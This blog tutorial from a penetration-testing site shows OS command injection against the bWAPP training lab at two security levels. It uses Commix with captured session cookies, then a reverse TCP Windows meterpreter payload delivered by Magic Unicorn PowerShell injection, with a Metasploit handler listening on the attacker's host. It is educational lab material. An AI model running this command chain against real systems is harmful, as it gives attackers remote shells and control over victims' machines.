<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Powershell Injection Attacks using Commix and Magic Unicorn</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/powershell-injection-attacks-using-commix-magic-unicorn/" rel="bookmark"><time class="entry-date published" datetime="2016-12-02T15:04:23+00:00">December 2, 2016</time><time class="updated" datetime="2025-05-27T12:04:07+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p style="text-align: justify;"><span style="color: #000000;">Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</span></p>
<p style="text-align: justify;"><span style="color: #000000;">This attack differs from Code Injection, in that code injection allows the attacker to add his own code that is then executed by the application. In Code Injection, the attacker extends the default functionality of the application without the necessity of executing system commands. Source:</span></p>
<p><a href="https://owasp.org/www-community/attacks/Command_Injection"><strong>https://www.owasp.org/index.php/Command_Injection</strong></a></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Requirement:</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Xampp/Wamp Server</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>bWAPP Lab</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Kali Linux: Burp suite, Commix tool</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">You need to install bWAPP lab in your XAMPP or WAMP server, for this you can visit the link web Pentest lab setup using bwapp</span> <a href="https://www.hackingarticles.in/web-application-lab-setup-on-windows/">here</a><strong>.</strong></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Our task is to get meterpreter shell through os command injection-Blind attack using bWAPP</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">Start service <strong>Apache</strong> and <strong>Mysql</strong> in Xampp or Wamp server. Let’s open the local host address in browser as I am using 192.168.1.103:81/bWAPP/login.php. Enter user and password bee and bug respectively.</span></p>
<p style="text-align: justify;"><span style="color: #000000;">My task is to bypass all three security level in bWAPP through os command injection.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Let start!!!!</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">Set the security level low, from list box choose your bug select <strong>os command injection-Blind</strong> now and click on hack.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-dKkTNDeWYu8/WEGIhyPoC3I/AAAAAAAAOfA/Z5Nr8E0vAogJbsw_PbeubDHTiN175wEkwCLcB/s640/1.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Type your IP in the text field and just after that start the burp suite in kali Linux. Don’t forget to set proxy in your browser while using the burp suite.</span></p>
<p style="text-align: justify;"><span style="color: #000000;">To capture the cookie of bWAPP click on <strong>proxy</strong> tag then click to <strong>inception is on button</strong>, come back to bWAPP and now click to PING button.</span></p>
<p style="text-align: justify;"><span style="color: #000000;">Look at image you will find that I have got the details.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-iVjNm7PxmPU/WEGIi227DUI/AAAAAAAAOfQ/ii7muYofPE0LMI-AOfsjhGJu-uZjMLB-wCLcB/s640/2.png"/></p>
<p><span style="color: #000000;">Open the terminal in kali Linux and type the commix command.</span></p>
<p><span style="color: #000000;"><strong>From intercepted data under burp suite copy the referrer, cookie and target and use this in the following command</strong></span></p>
<p><span style="color: #000000;"><strong> </strong><strong>commix –url=”http://192.168.1.101:81/bWAPP/commandi_blind.php” –data=”target=target=192.168.1.101&amp;form=submit” –cookie=”BEEFHOOK=eZsF6q03quZVSJwV87iaxpRmGI6Z6vIb1ZrNAmXVacVI3lR4jl96sgu418FXxBaMPh1K6rPkyrKT5y9O; security_level=0; PHPSESSID=5m82jlcacsvb2rfmn73gt3egi2″</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">This command will execute the commix tool in terminal which automatically perform command injection attack using url and cookie information in bWAPP.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://2.bp.blogspot.com/-y9dO2DoKoMs/WEGIjGqCuEI/AAAAAAAAOfU/NMgRqKzv4RgPczawZiWFGNT93vp1Msx9wCLcB/s640/3.png"/></p>
<p><span style="color: #000000;">Commix found the target seems injectable via blind injection techniques and will further ask for pseudo terminal.</span></p>
<p><span style="color: #000000;">Type ‘y’ to resumed the classic injection point and to pseudo terminal shell</span></p>
<p><span style="color: #000000;">Here we got the commix os shell but our aim is meterpreter shell for that we need to type following commands.</span></p>
<p><span style="color: #000000;"><strong>commix(os_shell) &gt; reverse_tcp</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-U_60uzR8z1Y/WEGIjFFUenI/AAAAAAAAOfY/HUtdkBglTIA4-a-FmWHMdWVy4SD9oCSXwCLcB/s640/4.png"/></p>
<p><span style="color: #000000;"><strong>commix(reverse_tcp) &gt; set LHOST 192.168.1.101</strong></span></p>
<p><span style="color: #000000;"><strong>commix(reverse_tcp) &gt; set LPORT 4444</strong></span></p>
<p><span style="color: #000000;"> Option asks by commix to set backdoor for connection Type ‘2’ for other reverse TCP shells.</span></p>
<p><span style="color: #000000;"><strong>commix(reverse_tcp) &gt; 2</strong></span></p>
<p><span style="color: #000000;">Option asks by commix to set payload Type ‘7’ to use a Windows meterpreter reverse TCP shell.</span></p>
<p><span style="color: #000000;"><strong>commix(reverse_tcp) &gt;7</strong></span></p>
<p><span style="color: #000000;">Option asks by commix to set powershell injection attack Type ‘2’ to use TrustedSec’s Magic Unicorn.</span></p>
<p><span style="color: #000000;"><strong>commix(reverse_tcp) &gt;2</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-wx3jqXGGFJQ/WEGIjf43VSI/AAAAAAAAOfc/jUveSka_F_EBGlQYulMQUOZPs5Dilz7lQCLcB/s640/5.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Above step will geneterate a shellcode  marked above in the image copy the whole shellcode <strong>“msfconsole -r /usr/share/commix/src/thirdparty/unicorn/unicorn.rc” </strong>and paste in <strong>new terminal</strong> which will start <strong>multi handler </strong>by its own.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-cKqdACa-WPo/WEGIjor3PrI/AAAAAAAAOfg/w-s0TKOgfZY3Oq1G2PnZeeg7NiGIJjE4QCLcB/s640/6.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Once metasploit framework gets loaded and starts the payload handler; come back to your previous terminal and press <strong>enter</strong>. As it is mention in image.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Luckly!! We succeeded in our task we have got meterpreter shell.</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Meterpreter&gt;sysinfo</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-M9C1LAQ-IO4/WEGIkwW3AJI/AAAAAAAAOfw/HzyqszkCLu4WbJ_2YKm7HnLx6OAd9PM1QCLcB/s640/7.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Same task we going to perform with same process but with another type of vulnerability. Set the security level low, from list box choose your bug select <strong>os command injection</strong> now and click on hack.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-pDIQmarJe0Y/WEGIkEWa_VI/AAAAAAAAOfk/Yjd1IzGDuIUUfvEuNrwOEXIYoJIR2Oo6QCLcB/s640/8.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Type your IP in the DNS lookup field and just after that start the burp suite and set manual proxy of browser. Click on <strong>proxy</strong> tag then click to <strong>inception is on button</strong>, come back to bWAPP and now click to Lookup.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://2.bp.blogspot.com/-oVZOoXdalIw/WEGIkXioD3I/AAAAAAAAOfo/hYRzw2bMiXw_GOtv2J3cUoGtGXV4OKdeQCLcB/s640/9.1.png"/></p>
<p><span style="color: #000000;">Open the terminal in kali Linux and type the commix command.</span></p>
<p><span style="color: #000000;"><strong> </strong><strong>commix –url=”http://192.168.1.101:81/bWAPP/commandi.php” –cookie=”BEEFHOOK=eZsF6q03quZVSJwV87iaxpRmGI6Z6vIb1ZrNAmXVacVI3lR4jl96sgu418FXxBaMPh1K6rPkyrKT5y9O; security_level=1; PHPSESSID=79egt1piglgkadfnaa6dujass7″ –data=”target=192.168.1.101&amp;form=submit”</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-tKhe6Tzv6x0/WEGIkgSo8MI/AAAAAAAAOfs/8GujD9OYeYQW1IKi8ivIzLw32Nu820bMACLcB/s640/9.png"/></p>
<p><span style="color: #000000;">Type ‘y’ to resumed the classic injection point and to pseudo terminal shell</span></p>
<p><span style="color: #000000;">Here we got the commix os shell but our aim is meterpreter shell for that we need to type following commands.</span></p>
<p><span style="color: #000000;"><strong>commix(os_shell) &gt; reverse_tcp</strong></span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-E7vkp0vxGLo/WEGIhulyLFI/AAAAAAAAOe4/7861P0oRvis3vEsDSpm2NkYzZf639HpZgCLcB/s640/10.png"/></p>
<p><span style="color: #000000;"><strong>commix(reverse_tcp) &gt; set LHOST 192.168.1.101</strong></span></p>
<p><span style="color: #000000;"><strong>commix(reverse_tcp) &gt; set LPORT 4444</strong></span></p>
<p><span style="color: #000000;"> Option asks by commix to set backdoor for connection Type ‘2’ for other reverse TCP shells.</span></p>
<p><span style="color: #000000;"><strong>commix(reverse_tcp) &gt; 2</strong></span></p>
<p><span style="color: #000000;">Option asks by commix to set payload Type ‘7’ to use a Windows meterpreter reverse TCP shell.</span></p>
<p><span style="color: #000000;"><strong>commix(reverse_tcp) &gt;7</strong></span></p>
<p><span style="color: #000000;">Option asks by commix to set powershell injection attack Type ‘2’ to use TrustedSec’s Magic Unicorn.</span></p>
<p><span style="color: #000000;"><strong>commix(reverse_tcp) &gt;2</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-kLOYYtkbCc8/WEGIhhqr4oI/AAAAAAAAOe8/fcsDsGSH28MBj_BZ6Nn4gywQAeAQNd1ygCLcB/s640/12.png"/></p>
<p><span style="color: #000000;">Above step will geneterate a shellcode  marked above in the image copy the whole shellcode <strong>“msfconsole -r /usr/share/commix/src/thirdparty/unicorn/unicorn.rc” </strong>and paste in <strong>new terminal</strong> which will start <strong>multi handler </strong>by its own.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-wjQuvONgWmQ/WEGIiaNB7YI/AAAAAAAAOfE/8N5stKCHQkA_Y_eG7lrt7Y4777olaKGnQCLcB/s640/13.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Once metasploit framework gets loaded and starts the payload handler come; back to your previous terminal and press <strong>enter</strong>. As it is mention in image.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Luckly!!  Again we succeeded in our task we have got meterpreter shell.</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Meterpreter&gt;sysinfo</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-EP5U2HRYoy8/WEGIiY9_XCI/AAAAAAAAOfM/zlc6Q5xPhKE67a-k_F7ruehI_4wl8LiZACLcB/s640/15.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Author</strong>: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact</span><a href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
